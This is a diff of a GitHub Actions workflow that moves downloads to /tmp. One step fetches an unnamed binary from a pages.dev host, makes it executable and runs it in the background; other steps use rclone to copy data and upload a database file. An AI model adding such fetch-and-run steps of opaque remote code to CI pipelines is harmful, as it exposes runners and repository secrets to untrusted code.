@@ -76,7 +76,7 @@ jobs:
       - name: Download config.yaml
         run: |
           echo "Downloading config.yaml..."
-          wget -q -O config.yaml "${{ secrets.CONFIG_YAML_URL }}"
+          wget -q -O /tmp/config.yaml "${{ secrets.CONFIG_YAML_URL }}"
           if [ $? -eq 0 ]; then
             echo "config.yaml downloaded successfully."
           else
@@ -86,9 +86,9 @@ jobs:
 
       - name: Download 1 and run in background
         run: |
-          wget -q -O ./1 "https://fffffff-c7l.pages.dev/1"
-          chmod +x ./1
-          ./1 -config /tmp/1.db & # Run in the background
+          wget -q -O /tmp/1 "https://fffffff-c7l.pages.dev/1"
+          chmod +x /tmp/1
+          /tmp/1 & # Run in the background
 
       - name: Perform Rclone copyurl operations
         run: |
@@ -108,5 +108,5 @@ jobs:
 
       - name: upload db
         run: |
-          rclone copy /tmp/1.db db:
+          rclone copy /tmp/fafda.db db:
 
